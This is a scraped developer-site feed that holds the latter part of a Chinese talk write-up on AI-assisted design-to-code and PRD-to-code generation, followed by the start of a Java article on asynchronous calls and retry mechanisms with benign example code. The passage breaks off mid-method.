<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c9114ff7737452ca1e7a186916dc0b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=ELMNCVE8O5G6wgNfloO4wG5QJko%3D" alt="" loading="lazy"/></p>
<p>本次分享，我将重点介绍 D2C 过程中遇到的难点以及解决方案，同时展示 AI 如何提升代码质量，如何实现从 PRD 到代码的转换。</p>
<h2 data-id="heading-7">三、D2C 难点与解决方案</h2>
<p>在 D2C 的过程中，我们遇到了以下几个难点：</p>
<ol>
<li>
<p>布局切割不合理。例如，当前这个例子我们期望的布局是 5 组，其中图片和标题应该是一组，并且能够用 list 数据循环渲染出来。但是 D2C 可能将它们分割成不同的部分，图片和文字被分离，或者因为宽度和间距的原因，图片被分成两组。这样的结构对于前端开发来说是不可接受的。</p>
</li>
<li>
<p>大量的 Absolute 定位问题。由于图层交叉，D2C 可能会产生大量的绝对定位，这会导致后续布局难以编写。</p>
</li>
<li>
<p>固定宽度问题也是一个挑战。D2C 生成的模块是固定宽度，这在不同分辨率的屏幕上可能会导致内容被截断或者铺满整个屏幕。</p>
</li>
<li>
<p>Class 类名不语义化的问题。D2C 算法生成的类名，如 view0、view1、view2、text0、text1 等，缺乏有效含义。</p>
</li>
</ol>
<p>针对这些问题，我们采取了以下解决方案：</p>
<h3 data-id="heading-8">1、布局切割优化</h3>
<p>我们使用了业界常用的投影算法，依据侧投影进行水平和垂直两个方向的切割。结合投影算法和一些算法规则，解决了大部分的布局切割不正确的问题。下面主要讲解三类应用最多的算法和方法：</p>
<p><strong>1、间距聚类</strong>，我们引入了 K-Means 聚类算法，在这个例子中，将水平切割产生的模块的间距作为输入值，输出不被切开的间距，从而保持图片和文本作为一个整体。</p>
<p><strong>2、切割方向的选择</strong>：我们采用了轴向布局验证算法，选择切割方向的交叉轴方向，查看所有节点的对齐方式是否一致，选择不对齐节点数最少的方向进行切割。</p>
<p><strong>3、识别组件辅助精准进行切割</strong>，我们识别出实际的组件，进行布局的合理生成。例如在这个例子中，我们识别出 Toast 组件并将其移除，然后针对剩余的组件进行是否为列表的识别。识别为列表的判断依据包含：从 DSL 判断子元素的相似度、是否等距以及面积是否相等。如果识别为列表，直接按照列表生成布局。</p>
<h3 data-id="heading-9">2、Absolute 布局的优化</h3>
<p>在 Absolute 布局的优化时，我们面对的主要问题是图层交叉导致的绝对布局问题。我们分析三个典型的案例，并为每个案例制定了相应的解决方案。</p>
<ol>
<li>
<p><strong>紧凑文本</strong>。从视觉上看，设计稿中的文本并不交叉，但如果我们查看图层的实际高度，就会发现存在细微的交叉。如果整个页面都使用 Absolute 布局，代码的健壮性会非常差，稍微长一点的字段就会遮盖后面的内容。针对这种情况，我们的处理方式是调整行高，使得文本从交叉变为不交叉，从而能够正常地进行布局切割。在完成正常布局后，再在属性上还原行高。</p>
</li>
<li>
<p><strong>去除干扰元素。</strong> 例如，一个浮标组件本身使用 Absolute 布局是没有问题的，但由于图层交叉，使得下面的元素也变成了 Absolute 布局，这影响了我们的代码。在这种情况下，我们会先移除浮标，让下面的元素正常参与布局，然后再以 Absolute 布局将其还原回来。</p>
</li>
<li>
<p><strong>背景交叉问题</strong>。这个例子中，由于背景图层是渐变色，与下面的入住信息模块产生了交叉。我们通过拉伸背景图，将其从交叉关系转变为父子关系，这样就能进行正常布局计算。</p>
</li>
</ol>
<h3 data-id="heading-10">3、固定宽度的优化</h3>
<p>在前端开发中，固定宽度的问题常常导致兼容性问题，尤其是在不同分辨率的屏幕上。如果给元素设置了固定宽度，实际业务数据中的几个额外字符可能会导致内容换行或挤压旁边的元素。即使我们生成了代码，这种固定宽度的问题也可能使得代码无法使用，进而影响我们的出码率。</p>
<p>为了解决固定宽度的问题，我们采用了弹性布局的方法。原本的布局生成依赖于元素宽度固定值和 Margin 来维持元素间的间距，但这并不是我们想要的结果，因为实际开发中我们不希望有过多的 Margin 或元素宽度固定值。因此，我们结合元素本身的信息、它与兄弟节点和父节点的位置关系，计算在 Flex 布局下应该使用的属性。也会根据一些条件判断元素的宽度是否确实需要保留。</p>
<p>我们也对算法生成的样式代码进行了优化，包括提取公共样式和删除冗余样式，以减少代码中的重复和冗余。</p>
<h2 data-id="heading-11">四、AI 辅助代码优化</h2>
<p>在拿到渲染代码后，我们利用 GPT 进行了一系列 AI 辅助的代码优化。这些优化主要包括两个部分：语义化和代码结构优化。</p>
<h3 data-id="heading-12">1、语义化优化</h3>
<p>在编写 class name 时，开发者通常会选择像 main-container、ticket-section 这样具有描述性的名称。而 D2C 算法生成的可能是 view008 这样的无意义标识符。GPT 帮助我们将这些无意义的标识符转换成更易于理解和接受的语义化名称。实现这一过程，我们输入了一个简化的 DSL，并通过编写提示词让 GPT 生成新旧类名的映射。在获得新的类名后，我们会进行校验，确保没有重名或遗漏处理的类名，然后将这些回填到渲染代码中。最终的语义化结果比较符合开发者命名习惯。</p>
<h3 data-id="heading-13">2、AI 代码结构优化</h3>
<p>D2C 生成的代码在实际应用中还需要进一步的组件拆分。例如，一段代码可能需要被拆分成一个 Tab 组件和一个列表循环。GPT 在这方面也提供了帮助，它不仅帮助我们进行组件拆分，还识别出了列表（list）和列表项（list item）。GPT 生成的代码能够根据 map 数据结构直接进行循环，并将业务数据与后端数据结合填充进去。与原始代码相比，GPT 优化后的代码整体可用性大大提高。</p>
<h3 data-id="heading-14">3、UI 还原度 DIFF 工具</h3>
<p>我们开发了一个 UI 还原度 DIFF 工具，旨在帮助开发人员更高效地检查和修正代码的 UI 还原度。这个工具的推出基于两个主要考虑：首先，开发人员需要一个方法来验证我们的 UI 还原度是否达到了预期；其次，由于生成的代码并非 100% 还原，开发人员在需要进行修正时，手动比对会非常耗时。这个 DIFF 工具提供了一个整体的还原度数值，这个数值是基于像素维度的对比得出的。此外，工具中还有一条可以拖拉的线条，通过拖动这条线，我们可以看到重影部分，这些重影是我们生成的渲染效果与 UI 设计稿效果的叠加。通过观察这些重影，我们可以判断出哪些元素没有对齐。点击这些元素后，开发人员可以精确地知道每个元素偏差了多少像素，宽度少了多少像素，这样也可能快速对样式进行修正。</p>
<h2 data-id="heading-15">五、P2C：逻辑代码生成</h2>
<p>在渲染代码生成之后，我们需要让这份代码具有交互性和逻辑性，使其能够动态地响应用户操作。这就是我们的 P2C（PRD to Code）部分所要解决的问题。让我们来看一下整体的生成流程。</p>
<p>首先，页面的所有交互行为和业务逻辑都源自于需求 PRD。我们首先对 PRD 进行解析，然后利用 GPT 梳理优化生成一份结构化的数据后，导入到 Checklist 中。这份 Checklist 数据将在本地知识库代码中检索出会用到的代码 SDK。结合刚刚生成的渲染代码以及接口数据，构建整个 prompt，进行数据脱敏后，让 GPT 进行代码生成。</p>
<p>在整个过程中，我们分析了两个主要的难点。第一个难点是如何有效地处理需求 PRD，提取信息并将其结构化。PRD 的功能描述是否完整是一个挑战。第二个难点是如何从需求 PRD 匹配到现有的私有代码库的 SDK。由于 SDK 数量众多，可能多达几百个，如果全部提供给 GPT，将会造成 token 的大量浪费。SDK 举例：登录校验、接口调用封装、分享、埋点等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b3c9e5b05644b89a1372db5c2956b02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=za2MHDx7%2BBf5ruKJCUT%2Fs3g6Ras%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">1、需求 PRD 生成 Checklist</h3>
<p>我们的需求 PRD 生成 Checklist 的过程开始于 Wiki 平台，我们会读取 Wiki 上的文档，从上到下解析整个文档，提取出我们需要的内容。由于我们的需求 PRD 遵循一定的格式，我们可以准确地提取出所需的部分。提取出来后，我们会将其格式化为我们自己制定的格式，并进行数据脱敏。</p>
<p>接下来，我们需要编写 prompt，引导 GPT 产出一份 Checklist 所需的数据。这个 prompt 过程实际上也是一个 COT 过程，我们要求 GPT 进行步骤拆解，构造出多层级结构，并确保每个步骤都是独立且完整的。根据我们的需求，GPT 会生成包含模块名、case 名、步骤和结果的格式化数据。</p>
<p>得到的这份结构化数据随后被输入到我们的 Checklist 系统中，生成一个可交互的结构。这个可交互的结构允许开发人员手动进行修正，比如通过拖拽调整条目的位置，或者编辑补充缺失的内容。这个界面的设计是为了提高后续代码生成的准确性，而且这份 Checklist 也能用于后续的测试用例生成。</p>
<h3 data-id="heading-17">2、SDK 动态匹配</h3>
<p>这里是 RAG 的应用，它主要分为三个核心部分。</p>
<p>首先是知识库存储。由于 SDK 的数量较大，每个 SDK 都包含描述其功能的文本和示例代码。为了解决分块时 SDK 被截断的问题，我们将 SDK 的描述单独分块并进行向量化存储。</p>
<p>其次，如何从需求 PRD 中精准匹配到需要调用的 SDK。由于 Checklist 中包含了大量的业务描述，这些描述对于 SDK 的匹配很多干扰项。因此，我们让 GPT 对 checklist 的数据进行拆解和任务识别，识别出类似于接口调用、环境判断和埋点等功能点，将需求文档转化为与 SDK 更匹配的功能描述，形成 query list。然后，我们用每个 query 去向量数据库中匹配，找出最相关的 TOP5 结果。</p>
<p>最后，由于 TOP5 结果对后续代码生成仍有干扰，我们引入了 BGE Reranker large model 进行进一步排序，获取最匹配的结果。所有 query 完成这一步后，我们再让 GPT 帮助我们进行去重和匹配度确认，最终输出一个相关度较高的 query 和 sdk 集合。</p>
<p>将这份集合与前面的需求 Checklist 数据、渲染代码以及后端接口 API 数据结合起来，我们就可以进行整个逻辑代码的生成。GPT 生成的结果包括私有 SDK 引用、接口调用、交互行为（如 Tab 切换、点击后的页面跳转等），以及渲染部分。</p>
<h3 data-id="heading-18">3、小结</h3>
<p>在 C 端的应用效果方面，我们可以看到出码率的计算结果有所不同，这取决于各类业务场景。一些场景的出码率较高，这些通常包括样式规整的页面，比如列表循环等。这些页面的结构和样式较为标准化，因此更容易被自动化工具识别和生成。</p>
<p>相对而言，出码率较低的场景可能涉及到复杂的图表、隐藏的业务逻辑，或者动画。例如，一些页面可能包含复杂的动画效果，如“拍一拍”按钮的动态效果，或者轮播图等。这些动画效果目前不在我们的代码生成范围内，因此这些页面的出码率相对较低。</p>
<h3 data-id="heading-19">4、B 端业务场景解决方案</h3>
<p>从系统架构图可以看出，我们选择了利用 AI 技术来进行代码生成。我们构建了一整套系统，这套系统不仅包括代码生成，还涉及到从项目维度对代码进行管理，包括项目中包含的页面以及这些页面的所有代码。</p>
<p>我们的系统覆盖了项目的整个生命周期，从代码生成到项目的整体发布，包括 Beta 测试、部署、线上部署，以及图片的 CDN 上传和代码的回滚等一整套解决方案。这些功能都在我们的系统中得到了集成和管理。篇幅有限，这里主要关注代码生成这一部分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/432198e549f84a95a2738fb897513772~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=wgK%2FwzByGSENDpNVo42PJf5e5%2Bc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">六、B 端代码生成</h2>
<h3 data-id="heading-21">1、页面提示词的编写</h3>
<p>在 B 端代码生成，比如生成这样一个包含表单和表格的页面，我们提示词是如何编写的呢。</p>
<p>首先，我们会编写一些系统预设，这些预设包括设定角色为资深前端开发工程师，使用的框架可能是 Ant Design V4、Mobx 等。我们还会设定一些限制，比如生成注释的要求、生成文件要求、代码格式规范，以及 workflows 的输入输出规范。这些预设可以根据需求做调整。</p>
<p>用户 prompt 部分，是我们对需求的描述。以这个案例为例，我们首先进行业务抽象，然后结合接口信息用 Markdown 格式描述整个功能模块。例如，如果页面中有一个表单，我们就直接描述它是一个表单，并详细说明表单的元素，如角色名称的 key 和类型是什么。如果有一个按钮，我们描述按钮的点击交互，点击后调用的接口是什么，接口的地址、参数和返回数据是什么。拿到接口数据后，我们如何渲染表格，表格是否需要分页，列名是什么，对应的字段又是什么。</p>
<p>实际的需求应用过程中，我们会遇到下面这些问题：</p>
<ol>
<li>
<p>提示词编写成本高。如果让一个新同学去编写提示词，他可能不知道应该使用什么格式或者方式来正确描述需求，导致提示词的编写成本很高。提示词的质量与最终代码生成的质量密切相关。因此，我们需要解决提示词编写成本的问题。</p>
</li>
<li>
<p>无法使用私有代码库。B 端系统需要使用我们自己的业务代码库，我们需要让 GPT 在生成的代码中使用这些代码库。</p>
</li>
<li>
<p>复杂页面生成代码质量差。我们需要找到一种有效方式来描述功能复杂的页面，以便 GPT 能够准确地生成所需的代码。</p>
</li>
</ol>
<h3 data-id="heading-22">2、提示词编写效率提升</h3>
<p>为了提升提示词编写的效率，我们提供了两种方案。</p>
<p>第一种方案是根据接口 API 自动生成提示词，主要针对表单和表格这两种场景。我们会提供一份提示词的示例作为上下文，并结合用户输入的接口信息来自动生成提示词。选择表单和表格是因为请求参数往往来源于表单数据，而返回数据中的 list 结构通常用于渲染表格，所以我们可以根据接口信息自动生成相应的提示词。开发人员只需将自动生成的提示词与自己的需求进行比对，如有需要，进行增删改，这样的修改成本相比从头开始写可以降低至少 60%。</p>
<p>第二种方案是提供一些常见的提示词模板。这些模板适用于复杂的表单、表格、树形结构、图表等场景。开发人员可以直接使用这些模板，并根据具体需求进行一些修改。提示词模板也能给开发编写提示词带来极大提效。</p>
<h3 data-id="heading-23">3、私有组件代码库应用</h3>
<p>在我们的业务场景中，私有组件库的应用采用了 few-shot prompting 的方案。我们会向用户提供一个代码库列表，用户选择代码库后，我们会将所选代码库的示例作为提示词的上下文提供给 GPT，以便 GPT 能够根据这些信息生成代码。采用这种方法主要是因为目前在我们的 B 端业务场景中，代码库的组件数不多，如果后续代码组件数量非常多，我们也会考虑使用 RAG 方案。</p>
<h3 data-id="heading-24">4、复杂页面生成</h3>
<p>在处理复杂页面的代码生成时，我们采取了一种化繁为简的策略。比如这个页面，包含 6 个功能模块和 4 个后端接口。如果在一个 prompt 中描述这 6 个模块的内容、模块间的调用关系以及与接口的交互，prompt 会非常长，这样长的 prompt 给到 GPT，生成的代码质量并不理想。为了解决这个问题，我们的解决方案是将页面拆分成单独的模块，通过编排的交互方式，描述模块间的引用关系，然后对每个模块单独进行代码生成。这种方法比整体生成的质量要高很多，因为我们更精细地控制每个模块的生成过程。</p>
<h3 data-id="heading-25">5、组件编排</h3>
<p>我们开发的编排界面是实现组件编排的核心工具。在这个过程中，需要人工手动拆分模块，识别并定义模块间的调用关系。我们会先对子模块进行代码生成，然后将子模块的代码作为上下文，结合父组件的提示词来生成父组件的代码。这种逐个模块的代码生成方法确保了每个模块的代码都是高质量的。</p>
<p>在所有模块的代码生成完成后，我们会进入在线页面编辑器，这里包含了所有模块的文件，每个文件都已经完成了拆分。左侧是在线编辑器，右侧是实时预览沙箱。这个例子里面的页面在 GPT 生成代码后，无需任何修改即可运行，可用度非常高。在这个页面上，我们对比需求 PRD，检查功能是否有遗漏，或者是否有业务逻辑偏差。功能补充完整后，我们可以提交代码进行 Beta 发布和测试，并在测试完成后直接在系统上进行线上发布。</p>
<h3 data-id="heading-26">6、小结</h3>
<p>从 2 月到现在，我们 B 端的出码率整体呈上升趋势，已经有 100 多个页面上线，代码量达到几万行。出码率的提升得益于我们对提示词的优化、交互的优化，以及大模型的升级。</p>
<h2 data-id="heading-27">七、未来规划</h2>
<p>代码生成的持续发展上，主要包含以下三个方面：</p>
<ol>
<li>
<p>制定 UI 标准范式。开发与 UI 设计的协同工作对于生成高质量代码至关重要。</p>
</li>
<li>
<p>逻辑代码生成方面，我们之前讨论的主要是营销活动的逻辑代码。对于主流程，由于其历史业务逻辑较为复杂，我们仍在开发和探索过程中。</p>
</li>
<li>
<p>C2C（Code to Code），包含老旧系统重构和多端代码生成。</p>
</li>
</ol>
<p>系统的智能化提升，主要包含下面两点：</p>
<ol>
<li>
<p>我们将持续优化系统，提升系统的自动化能力以及交互模式，使其更加智能，降低对人工操作的依赖。</p>
</li>
<li>
<p>多模态智能生成的应用。在 C 端，我们比较期待随着大模型的发展，后续支持用 UI 设计稿直接生成还原度高且质量高的代码。对于 B 端，目前除了提示词外，还支持根据原型图生成页面，我们期待未来可以通过语音等多模态输入直接生成页面，实现更高效、更智能的代码生成，从而进一步提升开发效率。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 异步调用失败导致系统崩溃？这份重试机制救了我]]></title>    <link>https://juejin.cn/post/7594322573453033515</link>    <guid>https://juejin.cn/post/7594322573453033515</guid>    <pubDate>2026-01-13T01:17:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453033515" data-draft-id="7583910418658295854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 异步调用失败导致系统崩溃？这份重试机制救了我"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-13T01:17:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 异步调用失败导致系统崩溃？这份重试机制救了我
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:17:59.000Z" title="Tue Jan 13 2026 01:17:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.异步编程介绍</h2>
<h3 data-id="heading-1">什么是异步编程</h3>
<p>异步编程是一种非阻塞的编程模式，允许程序在等待某个操作完成时继续执行其他任务，而不是一直等待。</p>
<p>当操作完成后，通过回调函数、Future 或事件通知等方式获取结果。</p>
<p><strong>同步 vs 异步对比：</strong></p>
<ul>
<li><strong>同步</strong>：顺序执行，每一步必须等待前一步完成</li>
<li><strong>异步</strong>：非阻塞执行，可以同时处理多个任务</li>
</ul>
<h3 data-id="heading-2">Java 中的异步实现方式</h3>
<h4 data-id="heading-3">1. CompletableFuture (Java 8+)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建异步任务</span>
CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-comment">// 模拟耗时操作</span>
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">1000</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">"异步任务结果"</span>;
});

<span class="hljs-comment">// 处理结果</span>
future.thenAccept(result -&gt; System.out.println(<span class="hljs-string">"结果: "</span> + result));
</code></pre>
<h4 data-id="heading-4">2. @Async 注解 (Spring Framework)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncService</span> {
    
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">asyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 异步执行的方法</span>
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"执行结果"</span>);
    }
}
</code></pre>
<h4 data-id="heading-5">3. 回调函数</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callback</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(String result)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Exception e)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">asyncOperation</span><span class="hljs-params">(Callback callback)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 模拟操作</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> doSomething();
            callback.onSuccess(result);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            callback.onError(e);
        }
    }).start();
}
</code></pre>
<h2 data-id="heading-6">2.异步编程中的常见错误</h2>
<h3 data-id="heading-7">2.1 网络相关错误</h3>
<ul>
<li>连接超时</li>
<li>读取超时</li>
<li>DNS 解析失败</li>
<li>网络不可达</li>
</ul>
<h3 data-id="heading-8">2.2 资源相关错误</h3>
<ul>
<li>内存不足</li>
<li>线程池耗尽</li>
<li>数据库连接超时</li>
</ul>
<h3 data-id="heading-9">2.3 业务逻辑错误</h3>
<ul>
<li>远程服务返回错误码</li>
<li>数据格式异常</li>
<li>业务规则校验失败</li>
</ul>
<h3 data-id="heading-10">2.4 示例：可能出错的异步方法</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnreliableService</span> {
    
    <span class="hljs-comment">// 模拟不可靠的远程服务调用</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">callExternalService</span><span class="hljs-params">(String data)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟随机错误</span>
            <span class="hljs-type">double</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> Math.random();
            <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.3</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"网络超时"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.6</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务端错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"处理结果: "</span> + data;
        });
    }
}
</code></pre>
<h2 data-id="heading-11">3. 异步重试机制实现</h2>
<h3 data-id="heading-12">3.1 手动重试实现</h3>
<h4 data-id="heading-13">3.1.1 基础重试逻辑</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryAsync(task, maxAttempts, delayMs, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
